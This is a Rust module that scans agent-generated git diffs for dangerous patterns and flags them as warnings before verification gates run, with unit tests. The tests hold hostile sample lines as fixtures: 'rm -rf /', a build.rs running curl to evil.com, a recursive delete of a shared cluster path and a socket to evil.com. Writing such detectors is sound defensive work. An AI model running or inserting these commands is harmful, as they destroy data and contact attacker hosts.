//! Pre-gate safety scan for dangerous code patterns in agent-generated diffs.
//!
//! Runs before verification gates to detect patterns that could be harmful when
//! compiled or tested (e.g., filesystem deletion, network access, arbitrary
//! command execution). Findings are reported as warnings — the orchestrator
//! decides whether to proceed or abort.

use std::path::Path;

use serde::{Deserialize, Serialize};

/// A dangerous pattern detected in the diff.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct SafetyWarning {
    /// Pattern category
    pub category: WarningCategory,
    /// File where the pattern was found
    pub file: String,
    /// Line number in the diff (approximate)
    pub line: Option<usize>,
    /// The matched text (truncated)
    pub matched_text: String,
    /// Human-readable explanation of why this is dangerous
    pub reason: String,
}

/// Categories of dangerous patterns.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum WarningCategory {
    /// New `unsafe` blocks in agent-generated code
    UnsafeBlock,
    /// Arbitrary command execution via `std::process::Command`
    CommandExecution,
    /// Filesystem deletion (`remove_dir_all`, `remove_file`)
    FilesystemDeletion,
    /// Network access (`std::net`, `reqwest`, `TcpStream`)
    NetworkAccess,
    /// Modifications to `build.rs` (arbitrary build-time execution)
    BuildScript,
    /// Proc-macro additions (arbitrary compile-time execution)
    ProcMacro,
}

impl std::fmt::Display for WarningCategory {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::UnsafeBlock => write!(f, "unsafe_block"),
            Self::CommandExecution => write!(f, "command_execution"),
            Self::FilesystemDeletion => write!(f, "filesystem_deletion"),
            Self::NetworkAccess => write!(f, "network_access"),
            Self::BuildScript => write!(f, "build_script"),
            Self::ProcMacro => write!(f, "proc_macro"),
        }
    }
}

/// Pattern definition for scanning.
struct Pattern {
    category: WarningCategory,
    /// Substring to match in added lines
    needle: &'static str,
    /// Human-readable reason
    reason: &'static str,
}

/// All patterns to scan for in added lines.
const PATTERNS: &[Pattern] = &[
    Pattern {
        category: WarningCategory::UnsafeBlock,
        needle: "unsafe {",
        reason: "New unsafe block — may introduce undefined behavior",
    },
    Pattern {
        category: WarningCategory::UnsafeBlock,
        needle: "unsafe{",
        reason: "New unsafe block — may introduce undefined behavior",
    },
    Pattern {
        category: WarningCategory::CommandExecution,
        needle: "std::process::Command",
        reason: "Arbitrary command execution — agent code should not spawn processes",
    },
    Pattern {
        category: WarningCategory::CommandExecution,
        needle: "process::Command::new",
        reason: "Arbitrary command execution — agent code should not spawn processes",
    },
    Pattern {
        category: WarningCategory::CommandExecution,
        needle: "Command::new(",
        reason: "Possible command execution — verify this is not std::process::Command",
    },
    Pattern {
        category: WarningCategory::FilesystemDeletion,
        needle: "remove_dir_all",
        reason: "Recursive directory deletion — catastrophic on shared NFS",
    },
    Pattern {
        category: WarningCategory::FilesystemDeletion,
        needle: "remove_file(",
        reason: "File deletion — verify scope is limited to intended targets",
    },
    Pattern {
        category: WarningCategory::NetworkAccess,
        needle: "std::net::",
        reason: "Network access — agent code should not make network calls",
    },
    Pattern {
        category: WarningCategory::NetworkAccess,
        needle: "TcpStream",
        reason: "TCP connection — agent code should not open network sockets",
    },
    Pattern {
        category: WarningCategory::NetworkAccess,
        needle: "UdpSocket",
        reason: "UDP socket — agent code should not open network sockets",
    },
    Pattern {
        category: WarningCategory::NetworkAccess,
        needle: "reqwest::",
        reason: "HTTP client — agent code should not make network requests",
    },
    Pattern {
        category: WarningCategory::ProcMacro,
        needle: "proc-macro",
        reason: "Proc-macro crate — enables arbitrary compile-time code execution",
    },
];

/// Scan the git diff of a working directory for dangerous patterns.
///
/// Runs `git diff HEAD` (or `git diff` for unstaged) and checks each added
/// line against the pattern list.
pub fn scan_diff(working_dir: &Path) -> Vec<SafetyWarning> {
    let mut warnings = Vec::new();

    // Get staged + unstaged diff
    let output = std::process::Command::new("git")
        .args(["diff", "HEAD"])
        .current_dir(working_dir)
        .output();

    let diff_text = match output {
        Ok(o) if o.status.success() => String::from_utf8_lossy(&o.stdout).to_string(),
        _ => {
            // Fallback: try unstaged diff
            let fallback = std::process::Command::new("git")
                .args(["diff"])
                .current_dir(working_dir)
                .output();
            match fallback {
                Ok(o) => String::from_utf8_lossy(&o.stdout).to_string(),
                Err(_) => return warnings, // No git available — skip scan
            }
        }
    };

    // Also check for build.rs in the diff header
    let has_build_rs_change = diff_text.contains("a/build.rs") || diff_text.contains("b/build.rs");
    if has_build_rs_change {
        warnings.push(SafetyWarning {
            category: WarningCategory::BuildScript,
            file: "build.rs".to_string(),
            line: None,
            matched_text: "build.rs modified".to_string(),
            reason: "Build script modification — enables arbitrary code at compile time"
                .to_string(),
        });
    }

    // Parse unified diff and scan added lines
    let mut current_file = String::new();
    let mut current_line: usize = 0;

    for line in diff_text.lines() {
        if let Some(rest) = line.strip_prefix("+++ b/") {
            current_file = rest.to_string();
            current_line = 0;
        } else if line.starts_with("@@ ") {
            // Parse hunk header: @@ -old_start,old_count +new_start,new_count @@
            if let Some(plus_part) = line.split('+').nth(1) {
                if let Some(start_str) = plus_part.split(',').next() {
                    current_line = start_str.parse().unwrap_or(0);
                }
            }
        } else if let Some(added) = line.strip_prefix('+') {
            // This is an added line — check against patterns
            for pattern in PATTERNS {
                if added.contains(pattern.needle) {
                    warnings.push(SafetyWarning {
                        category: pattern.category,
                        file: current_file.clone(),
                        line: Some(current_line),
                        matched_text: truncate_line(added, 120),
                        reason: pattern.reason.to_string(),
                    });
                }
            }
            current_line += 1;
        } else if !line.starts_with('-') {
            // Context line — increment line counter
            current_line += 1;
        }
    }

    warnings
}

/// Scan raw diff text (for testing without git).
pub fn scan_diff_text(diff_text: &str) -> Vec<SafetyWarning> {
    let mut warnings = Vec::new();
    let mut current_file = String::new();
    let mut current_line: usize = 0;

    let has_build_rs_change = diff_text.contains("a/build.rs") || diff_text.contains("b/build.rs");
    if has_build_rs_change {
        warnings.push(SafetyWarning {
            category: WarningCategory::BuildScript,
            file: "build.rs".to_string(),
            line: None,
            matched_text: "build.rs modified".to_string(),
            reason: "Build script modification — enables arbitrary code at compile time"
                .to_string(),
        });
    }

    for line in diff_text.lines() {
        if let Some(rest) = line.strip_prefix("+++ b/") {
            current_file = rest.to_string();
            current_line = 0;
        } else if line.starts_with("@@ ") {
            if let Some(plus_part) = line.split('+').nth(1) {
                if let Some(start_str) = plus_part.split(',').next() {
                    current_line = start_str.parse().unwrap_or(0);
                }
            }
        } else if let Some(added) = line.strip_prefix('+') {
            if added.starts_with("++") {
                // Skip diff header lines (+++ b/file)
                continue;
            }
            for pattern in PATTERNS {
                if added.contains(pattern.needle) {
                    warnings.push(SafetyWarning {
                        category: pattern.category,
                        file: current_file.clone(),
                        line: Some(current_line),
                        matched_text: truncate_line(added, 120),
                        reason: pattern.reason.to_string(),
                    });
                }
            }
            current_line += 1;
        } else if !line.starts_with('-') {
            current_line += 1;
        }
    }

    warnings
}

fn truncate_line(s: &str, max: usize) -> String {
    let trimmed = s.trim();
    if trimmed.len() <= max {
        trimmed.to_string()
    } else {
        format!("{}...", &trimmed[..max])
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const SAMPLE_DIFF: &str = r#"diff --git a/src/lib.rs b/src/lib.rs
index abc1234..def5678 100644
--- a/src/lib.rs
+++ b/src/lib.rs
@@ -10,6 +10,12 @@ fn helper() {
     let x = 42;
 }

+fn dangerous() {
+    unsafe {
+        std::ptr::null::<u8>().read();
+    }
+    let output = std::process::Command::new("rm")
+        .arg("-rf").arg("/").output();
 }
"#;

    #[test]
    fn test_scan_detects_unsafe_block() {
        let warnings = scan_diff_text(SAMPLE_DIFF);
        let unsafe_warnings: Vec<_> = warnings
            .iter()
            .filter(|w| w.category == WarningCategory::UnsafeBlock)
            .collect();
        assert!(!unsafe_warnings.is_empty(), "Should detect unsafe block");
    }

    #[test]
    fn test_scan_detects_command_execution() {
        let warnings = scan_diff_text(SAMPLE_DIFF);
        let cmd_warnings: Vec<_> = warnings
            .iter()
            .filter(|w| w.category == WarningCategory::CommandExecution)
            .collect();
        assert!(!cmd_warnings.is_empty(), "Should detect Command::new");
    }

    #[test]
    fn test_scan_detects_build_rs() {
        let diff = r#"diff --git a/build.rs b/build.rs
index abc..def 100644
--- a/build.rs
+++ b/build.rs
@@ -1,3 +1,5 @@
 fn main() {
+    std::process::Command::new("curl")
+        .arg("https://evil.com").output();
 }
"#;
        let warnings = scan_diff_text(diff);
        assert!(warnings
            .iter()
            .any(|w| w.category == WarningCategory::BuildScript));
        assert!(warnings
            .iter()
            .any(|w| w.category == WarningCategory::CommandExecution));
    }

    #[test]
    fn test_scan_detects_filesystem_deletion() {
        let diff = r#"diff --git a/src/cleanup.rs b/src/cleanup.rs
--- a/src/cleanup.rs
+++ b/src/cleanup.rs
@@ -1,3 +1,5 @@
 fn cleanup() {
+    std::fs::remove_dir_all("/cluster/shared").unwrap();
 }
"#;
        let warnings = scan_diff_text(diff);
        assert!(warnings
            .iter()
            .any(|w| w.category == WarningCategory::FilesystemDeletion));
    }

    #[test]
    fn test_scan_detects_network_access() {
        let diff = r#"diff --git a/src/net.rs b/src/net.rs
--- a/src/net.rs
+++ b/src/net.rs
@@ -1,3 +1,5 @@
 fn connect() {
+    let stream = std::net::TcpStream::connect("evil.com:443").unwrap();
 }
"#;
        let warnings = scan_diff_text(diff);
        let net_warnings: Vec<_> = warnings
            .iter()
            .filter(|w| w.category == WarningCategory::NetworkAccess)
            .collect();
        assert!(
            net_warnings.len() >= 1,
            "Should detect network access: {net_warnings:?}"
        );
    }

    #[test]
    fn test_scan_clean_diff_no_warnings() {
        let diff = r#"diff --git a/src/lib.rs b/src/lib.rs
--- a/src/lib.rs
+++ b/src/lib.rs
@@ -1,3 +1,5 @@
 fn helper() {
+    let x = 42;
+    println!("hello");
 }
"#;
        let warnings = scan_diff_text(diff);
        assert!(
            warnings.is_empty(),
            "Clean diff should have no warnings: {warnings:?}"
        );
    }

    #[test]
    fn test_scan_ignores_removed_lines() {
        // A removed unsafe block should NOT trigger a warning
        let diff = r#"diff --git a/src/lib.rs b/src/lib.rs
--- a/src/lib.rs
+++ b/src/lib.rs
@@ -1,5 +1,3 @@
 fn helper() {
-    unsafe {
-        std::ptr::null::<u8>().read();
-    }
+    let x = 42;
 }
"#;
        let warnings = scan_diff_text(diff);
        assert!(
            warnings.is_empty(),
            "Removed unsafe should not trigger: {warnings:?}"
        );
    }

    #[test]
    fn test_warning_serialization() {
        let warning = SafetyWarning {
            category: WarningCategory::UnsafeBlock,
            file: "src/lib.rs".to_string(),
            line: Some(15),
            matched_text: "unsafe { ptr::read(p) }".to_string(),
            reason: "New unsafe block".to_string(),
        };
        let json = serde_json::to_string(&warning).unwrap();
        let parsed: SafetyWarning = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed.category, WarningCategory::UnsafeBlock);
        assert_eq!(parsed.file, "src/lib.rs");
        assert_eq!(parsed.line, Some(15));
    }

    #[test]
    fn test_truncate_line() {
        assert_eq!(truncate_line("hello", 10), "hello");
        assert_eq!(truncate_line("hello world abc", 10), "hello worl...");
        assert_eq!(truncate_line("  padded  ", 20), "padded");
    }

    #[test]
    fn test_warning_category_display() {
        assert_eq!(format!("{}", WarningCategory::UnsafeBlock), "unsafe_block");
        assert_eq!(
            format!("{}", WarningCategory::CommandExecution),
            "command_execution"
        );
    }
}
